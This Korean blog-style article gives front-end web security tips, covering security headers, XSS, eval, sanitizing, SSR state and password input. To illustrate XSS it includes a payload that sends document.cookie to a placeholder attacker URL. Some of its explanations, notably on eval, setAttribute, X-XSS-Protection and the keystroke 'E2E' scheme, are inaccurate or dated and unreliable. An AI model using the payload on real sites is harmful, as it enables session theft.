# 프론트엔드 개발에서의 보안 팁



### 1. 강력한 컨텐츠 보안 정책(CSP) 사용



컨텐츠 보안 정책 (CSP)은 front-end 애플리케이션의 안전을 위해 시작할 수 있는 첫 단계라고 할 수 있다. CSP는 Mozila 재단에서 만든 표준인데, XSS (Cross-Site Scripting) 및 클릭 재킹 (clickjacking)을 포함하여 특정 유형의 코드 삽입 공격을 탐지하고 막아준다.

강력한 CSP는 잠재적으로 유해한 인라인 코드 실행을 비활성화해주고 외부 리소스가 로드되는 도메인을 제한하는 것이 가능하다. Content-Security-Policy 헤더를 세미콜론으로 구분지어서 사용할 수 있다. 아래는 웹 사이트가 외부 리소스에 액세스할 필요가 없는 경우 헤더설정이다.

```sh
Content-Security-Policy: default-src 'none'; script-src 'self';
img-src 'self'; style-src 'self'; connect-src 'self';
```

여기서는 script-src, img-src, style-src 및 connect-src 지시어를 self로 설정했다.
그러니까 이렇게 하게 되면 document를 로드 할때 css, script, image같은 리소스들은 HTML 문서가 제공되는 곳과 불러오는 곳이 동일해야 한다는 것이다. Defualt CSP 지침은 default-src로 설정하면 된다. 기본 동작이 URL에 대한 연결을 제한해야 하기 때문에 none으로 설정했다.

그러니까 보통 콘텐츠 보안정책은 동일출처 원칙이 기본이긴 하다. 예를 들어 `https://yohanpro.com`은 `https://yohanpro.com`의 데이터에만 액세스 할 수 있는 권한이 있다. `https://example.com`에는 액세스 권한이 없다.

그런데 웹어플리케이션을 만들다보면 대부분 다 알겠지만, 요즘 어플리케이션을 만들때에는 다른 곳에서 자원을 가져다 쓰기 마련이다. Google developer 콘솔에서 API를 가져오든, AWS S3에서 가져오든 말이다. 하지만 나중에 이런 곳의 도메인을 허용하도록 설정하더라도 일단 가장 엄격하게 설정해 놓는 것이 필요하다.

CSP 지침의 전체 목록은 [MDN 웹사이트](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)에서 찾을 수 있다.

------

### 2. XSS 보호 모드 사용



사용자 입력에서 악성 코드가 입력되는 것을 감지한다면 `"X-XSS-Protection": "1; mode = block"`헤더를 사용하면 된다. 이는 브라우저가 response를 차단하도록 만들 수 있다.

물론 요즘 최신 브라우저들은 XSS 보호모드가 기본으로 되어있긴 하다. 하지만 CSP 헤더를 지원하지 않는 브라우저들(IE라던지 IE라던지…)을 위해서 X-XSS-Protection 헤더를 포함해주는 것이 좋다.

------

### 3. 클릭재킹 공격을 방지하기 위해 iframe Embed 막기



클릭재킹 공격을 막기 위해서 iframe 임베딩을 막는 것이 필요하다. 클릭재킹 공격은 요즘 뉴스에도 나와서 핫한 공격이다. 쉽게 말하면 다른 사이트인척 속이는 것이다. 국민은행 피싱사이트가 예이다.

![피싱 사이트 예시](https://img1.daumcdn.net/thumb/R720x0.q80/?scode=mtistory2&fname=http%3A%2F%2Fcfile21.uf.tistory.com%2Fimage%2F12264444506C2C8325A82E)

이것 역시 헤더에 **X-Frame-option**을 줌으로써 해결할 수 있다.

```sh
"X-Frame-Options": "DENY"
```



또한 `frame-ancestors`를 사용할 수도 있는데, 이건 현재 페이지를 삽입할 수 있는 소스를 지정할 수 있다.`<frame>, <iframe>, <embed>, <applet>` 태그에 적용된다.

### 4. 브라우저 기능 및 API에 대한 액세스 제한하기



우리가 만든 웹사이트에서 필요하지 않은 것들에 대한 접근을 제한하는 것은 좋은 보안 습관이다. 이미 CSP를 사용하여 웹사이트가 접속할 수 있는 도메인 수를 제한하기 위해 이 원칙을 적용했지만, 브라우저 기능에도 이걸 넣을 수 있다.
브라우저가 `Feature-Policy` 헤더를 사용하여 애플리케이션이 필요로 하지 않는 특기능과 API에 대한 액세스를 거부하도록 만들 수 있다.

똑같이 세미콜론 구분자를 사용해서 문자열로 생성하면 된다.

```sh
"Feature-Policy": "accelerometer 'none'; ambient-light-sensor 'none'; autoplay 'none';
camera 'none'; encrypted-media 'none'; fullscreen 'self'; geolocation 'none';
gyroscope 'none'; magnetometer 'none'; microphone 'none'; midi 'none'; payment 'none';
picture-in-picture 'none'; speaker 'none'; sync-xhr 'none'; usb 'none'; vr 'none';"
```

[Smashing Magazine](https://www.smashingmagazine.com/2018/12/feature-policy/) 에서 사용할 수 있는 것들을 찾을 수 있다. 보통은 근데 쓰지 않는 기능은 `none`으로 설정할 것이다.

------

### 5. referrer 값 노출시키지 않기



웹 사이트에서 다른 곳으로 이동하는 링크를 클릭하면, 가고자 하는 웹 사이트는 웹 사이트에서 마지막 위치의 URL을 referrer 헤더로 받는다. 그런데 이 URL에는 세션 토큰이나 사용자 ID와 같은 민감한 데이터가 포함될 수 도 있기 때문에 노출하면 안된다.

이걸 막기 위해선 `Referrer-Policy`헤더를 `no-referrer`로 설정한다.

```sh
"Referrer-Policy": "no-referrer"
```



이렇게 만드는 것이 좋긴 한데, 세상 일이 그렇든 방문 유입경로나 코드 logic에 따라 referrer를 갖고 있어야 할 때도 있다.
[Scott Helme article](https://scotthelme.co.uk/a-new-security-header-referrer-policy/)에서 referrer 헤더를 어떻게 설정해야 하는지 알려준다.(same origin시나 https에서 http로 이동할 때 등)

### 6. 유저로부터 입력값을 받는 곳에 innerHTML 사용하지 말기



크로스사이트 스크립팅(XSS 공격)은 다양한 곳에서 사용되지만 그래도 가장 많이 사용되는 곳은 바로 “innerHTML”이다.

이번에 코로나 관련해서 중학생이 신천지사이트를 털은 적이 있었는데 아마도 게시판을 사용해서 XSS 공격을 하지 않았나 싶다. 유명한 공격이다.

`innerHTML`을 유저로부터 필터링 되지 않은 채로 설정하면 안된다. 사용자가 직접 조작할 수 있는 값(입력 필드의 텍스트, URL의 파라메터 또는 로컬 스토리지 항목)은 먼저 검사해야한다. `innerHTML`보다 `textContent`을 쓰는 것이 더 바람직하다. 만약 게시판처럼 긴 글을 작성할 수 있게 하려면 좋은 라이브러리를 사용해야 한다.

Dom-base XSS 공격을 방지하는 방법을 알려주는 이 [Trusted Types specification](https://developers.google.com/web/updates/2019/02/trusted-types) 구글 사이트를 눈여겨 보자.

------

### 7. UI 프레임워크 사용하기



React, Vue, Angular 같은 UI 프레임워크들은 이미 좋은 보안시스템이 내장되어 있다. 그리고 XSS의 위험으로부터도 막아 줄 수 있다. 이런 프레임워크들은 XSS에 민감한 DOM API를 사용할 일을 많이 줄여준다. 그리고 뭔가 잠재적으로 위험할만한 요소이면 이름을 `dangerouslySetInnerHTML` 같이 지어서 front-end 개발자로 하여금 쓰기 멈칫하게 만들고 다시 생각하게 해준다.

### 8. 디펜던시들을 최신상태로 유지해주기



`node_moduels` 폴더를 보면 알겠지만 우리가 만드는 웹 어플리케이션들은 수 백개의 퍼즐로 이루어진 레고 퍼즐과 다름이 없음을 알 수 있다. 그리고 우리가 디펜던시들을 사용할 때 보안 취약점이 있는지 없는지 확인하는 것은 매우 중요하다.

디펜던시가 믿을만한 건지 아닌지를 체크할 때 검사를 미리 해보는 것이 좋다. 이런 툴은 [Dependabot](https://dependabot.com/)과 [Snyk](https://snyk.io/)에서 확인 할 수 있다.

잠재적으로 취약한 점에 대해 pull-request를 요청해주고 수정사항을 더 빨리 적용하는데 도움이 된다.

`node_modules`는 node가 인기 있게 만드는 이유이긴 하지만, 라이언 달이 말했듯이 불필요한 모듈들이 설치가 되는 단점이 있다. 그리고 보안에 매우 취약할 수 밖에 없다. 내가 설치한 모듈이 내 파일을 수정할 수 있는 코드가 들어있을지도 모르는데 말이다. 그래서 올해 여름에 1.0버전을 출시할 `deno`가 궁금해진다. 이런 취약점들을 개선했다고 말하는데 아직 살펴보진 않아서 대충 흘러가는 뉴스들만 보고 있다.

### 9. third-party를 사용하기전에 한번 더 생각해보기



Google Analytics, Intercom, Mixpanel 같은 third-party들은 “한 줄 코드” 솔루션을 제공한다. 그런데 그 뜻은 그와 동시에 third-party가 손상되면 웹 사이트가 손상되기 때문에 웹 사이트를보다 취약하게 만들 수 있다.

third-party를 통합하기로 결정한 경우에는 해당 서비스가 정상적으로 작동하도록 허용하는 가장 강력한 CSP 정책을 설정하는 것이 좋다. 널리 사용되는 대부분의 서비스는 필요한 CSP 가이드라인이 있으니 지침을 따라야 한다.

Google Tag Manager, Segment 같이 조직 내 모든 사람이 더 많은 third-party를 통합 할 수 있는 기타 툴들을 사용할 때는 특히 주의해야 한다. 이 도구에 액세스 할 수있는 사람은 어떻게 보안이 돌아가는지 알고 있어야 한다.

### 10. third-party 스크립트에 Subresource integrity 사용하기



사용하는 third-party 스크립트의 경우에는 가능한 한 `integrity` attribute를 사용하는 것이 좋다. 브라우저 자체 기능에는 로드 중인 script들의 암호화 해시를 검증하고 변경되지 않았는지 확인할 수 있는 [Subresource Integrity ](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)가 있다.

이건 `script` 태그가 이렇게 생겼다.

```html
<script
  src="https://example.com/example-framework.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

이러한 기법은 third-party 라이브러리에는 괜찮다. 그런데 third-party 서비스에는 그닥 유용하지 못하다. 왜냐면 대부분의 경우에는 third-party 서비스의 스크립트를 추가할 경우 그 스크립트가 하는 역할은 보통 다른 디펜던트 스크립트를 불러오는 역할을 하기 때문이다. 근데 이건 언제든지 바뀔 수 있으므로 위험한지 아닌지 무결성을 검증할 수 있는지 없는지 우리가 알 수 없다.



## 11. eval()

eval() 함수는 매개 변수로 받은 문자열, 객체를 파싱해서 실행합니다. [MDN eval() 문서](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) 말미에 `Never use eval()!` 이라는 챕터가 있으니 한 번 읽어보시는 게 좋습니다.

eval() 함수는 다음과 같은 형태로 사용할 수 있습니다.

```javascript
eval('console.log(`hi`)');
=> hi
```

실제로는 주로 JSON 객체를 편하게 파싱하기 위해 사용하게 됩니다. 하지만 eval함수를 그냥 사용하는 경우는 드물겠죠.

우리가 더 주의해야 하는 경우는 내부적으로 eval을 실행하는 *다른 메서드*를 사용할 때 입니다.

```javascript
setTimeout("alert('에이 설마 이게 되겠어..?')", 1000);
```

만약 해당 코드의 실행부를 변수로 할당했다고 가정해봅시다.

```javascript
let foo;

foo = someHackerInputText;

setTimeout(foo, 1000);
```

이제 foo 부분에 들어가는 함수, 문자열, 객체 어떤것이든 eval()을 트리거하고, 원하는대로 브라우저를 조작할 수 있게 되었습니다. 이걸 예방하는 방법은 사실 간단합니다.

```javascript
let foo;
setTimeout(() => alert("성공"), 1000);
```

익명 함수로 감싸주면 더 이상 내부의 문자열을 평가하려는 시도가 일어나지 않습니다. `eval()`은 매개 변수가 없는 익명 함수 `()`를 호출하고 반환값으로 받은 `alert('성공')` 이 실행됩니다.

같은 예로 `setAttribute("someHTMLEvent", "...")` 가 있습니다.

```jsx
const func1 = () => alert("짜잔");

someButton.setAttribute("onclick", func1()); // BAD
someButton.addEventListner("click", () => func1()); // NOT BAD
```

`setAttribute` 의 두 번째 인자는 평가됩니다.

하지만 진정한 위협은 자바스크립트의 일급 함수 특성을 이용해 간단히 회피할 수 있는 위의 메소드들이 아닙니다.

## 1 - 1. InnerHtml

`innerHTML`이나 리액트의 `dangerouslySetInnerHTML`은 퍼포먼스 차이가 존재하지만, 본질적으로 위험하다는 사실은 같습니다. 하지만 편안한 구현을 위해 필요한 친구들이기도 하지요.

이들은 프론트엔드에서 일어날 수 있는 가장 큰 보안 허점인 XSS를 유발할 수 있습니다.

> XSS(Cross-Site-Scripting) 공격자가 프로덕트에 원치 않는 코드를 삽입하여 실행하는 취약점입니다.

리액트로 예를 들어보겠습니다.

```jsx
import React from 'react';
import VeryDangereousInput from '@src/components/';
import fetchComments from '@api';

const Compo = () => {
  const [comments, setComments] = React.useState([]);
  const [value, setValue] = React.useState()

  React.useEffect(() => {
    fetchComments();
  })

  const _init = async () => {
    const _comments = await fetchComments();
    setComments(_comments);
  };

  return (
    <VeryDangereousInput value={value} onChange={(inputText) => setValue(inputText)} />
    <ul>
      {comments.map(c => <li key={c.id} dangerouslySetInnerHTML={{ __html: c.value }}/>)}
    </ul>
  )
}
```

위의 컴포넌트는 코멘트를 받는 그대로 저장하고, 그걸 그대로 출력하게 됩니다.

이 상황에서 악의적인 공격자가 다음과 같은 문자열을 입력한다면 어떻게 될까요?

```html
<img src="보안이 엉망이군요" onerror={fetch(http://HACKERS-RULES-URL,
{document.cookie})} />
```

네. 해당 페이지에 들어간 고객들의 쿠키 정보가 해커들에게 자동으로 수집되게 되었습니다.

쿠키에 세션 아이디나 각종 토큰을 보관하는 경우라면 엄청나게 큰 보안사고로 이어질 수 있습니다.

하지만 WYSIWIG 에디터, 마크다운 파서, 텍스트 소스에서의 마크업은 필요한 일이 상당히 있고,

이때마다 별도의 인터페이스를 작성하는 것은 몹시 힘들고 지치는 일입니다.

가장 간단한 해법은 `HTML sanitizing`을 적용하는 것입니다.

[sanitize-html @npm](https://www.npmjs.com/package/sanitize-html)

위의 라이브러리를 사용하면 삽입되었을 때 위험한 문자열을 제거해줍니다.

각종 태그에 onerror등 네이티브 이벤트 핸들러 등이 부착되는 상황을 예방할 수 있습니다.

아니면 스스로 Validator를 만들어 해당 위험요소를 제거할 수도 있습니다. 정규식을 이용해 위험한 문자열을 추출해내는 방식을 적용해도 좋고, Flux 아키텍처를 사용한다면 스토어에 dispatch 하기 전에, 혹은 db에 해당 문자열을 보내기전에 사전 검열하는 방식으로 사용할 수도 있습니다.

------

## 12. 서버사이드 렌더링



SSR을 실행할 때 한가지 더 체크해야 할 문제가 있습니다.

Redux등 상태관리 라이브러리를 사용한다면, 초기 변수에 의존하는 렌더링을 구성하기 쉬운데 이 때 `preloaded state`를 사용하게 됩니다.

```javascript
function renderFullPage(html, preloadedState) {
  return `
    <!doctype html>
    <html>
      <head>
        <title>Redux Universal Example</title>
      </head>
      <body>
        <div id="root">${html}</div>
        <script>
          // WARNING: See the following for security issues around embedding JSON in HTML:
          // https://redux.js.org/recipes/server-rendering/#security-considerations
          window.__PRELOADED_STATE__ = ${JSON.stringify(preloadedState).replace(
            /</g,
            "\\u003c"
          )}
        </script>
        <script src="/static/bundle.js"></script>
      </body>
    </html>
    `;
}
// 출처: 리덕스 공식 문서 (https://redux.js.org/recipes/server-rendering)
```



이 `renderFullPage()` 함수를 호출하기 전에 스토어의 모든 값을 객체로 preloadedState 매개 변수로 넘겨주게 됩니다.

스토어의 모든 정보가 소스에 노출된다는 것과 같습니다. 크롤링에 굉장히 취약해지고 스토어에 민감한 정보를 보관한 경우라면(그러면 안 좋지만!) 보안 사고로 이어질 수 있습니다.

여기에도 1 에서 했던 것과 같이 sanitizing을 적용할 수 있습니다.



```js
JSON.stringify(state).replace(/</g, "\\u003c");
```

혹은 [라이브러리](https://github.com/yahoo/serialize-javascript)로 직렬화해도 좋습니다. 이걸로 스토어에 위험한 소스코드가 인젝션되는 상황을 예방할 수 있습니다.

순서대로 말하면,

1. 스토어를 가져와서 sanitizing
2. 해당 스토어 객체를 직렬화
3. 직렬화한 문자열을 특정 DOM에 삽입해서 클라이언트로 보내준다.
4. 클라이언트에서는 그 DOM의 내용을 initState로
5. 해당 DOM 자체를 삭제한다.


의 과정을 거치게 됩니다. 위의 순서만 기억하세요!

------

### 13. E2E 암호화

사용자가 패스워드를 입력하는 경우를 생각해봅시다.

이 때, 평문을 처리하는 방식으로 변수 하나(password)에 문자열을 저장하고 입력시마다 해당 문자열을 갱신한다면?

```text
password: q
password: q1
password: q1w
password: q1w2
...
```



사용자가 입력할때마다 해당 변수는 갱신될것이고, 해당 입력값은 키로거 같은 별도의 준비 없이도 간단히 탈취가 가능할 것입니다. 특히 위에 언급한 XSS 공격과 결합되면 순식간에 모든 유저의 패스워드가 유출될 수도 있습니다.

API로 보내기 전에 암호화를 하는 방식의 문제점이 여기에 있습니다. 통신 간에는 안전하더라도 저희가 통제할 수 없는 클라이언트 영역에서 일어나는 탈취를 막을 방법이 필요합니다.

여기서 필요한 개념이 E2E 암호화입니다.



```text
E2EPassword: ['sad4234nbjktbkb234bjk!- sdgkjbsdkb2312bk1-sdkjgbkdgks213']
E2EPassword: ['sad4234nbjktbkb234bjk!- sdgkjbsdkb2312bk1-sdkjgbkdgks213',
              'sdgnaklsn23423424'-'...']
...
```



이런식으로 사용자가 한글자를 입력할때마다 암호화를 진행하고, 암호화된 객체를 서버로 전송해서 서버에서 이를 복호화하여 패스워드로 사용합니다. 이 방식에서는 개발자도구등에서 한글자를 입력할때마다 암호화된 해시값밖에 볼 수 없으며, 암호화 규칙을 추가하면 추가할수록 더욱 안전한 방식이 됩니다.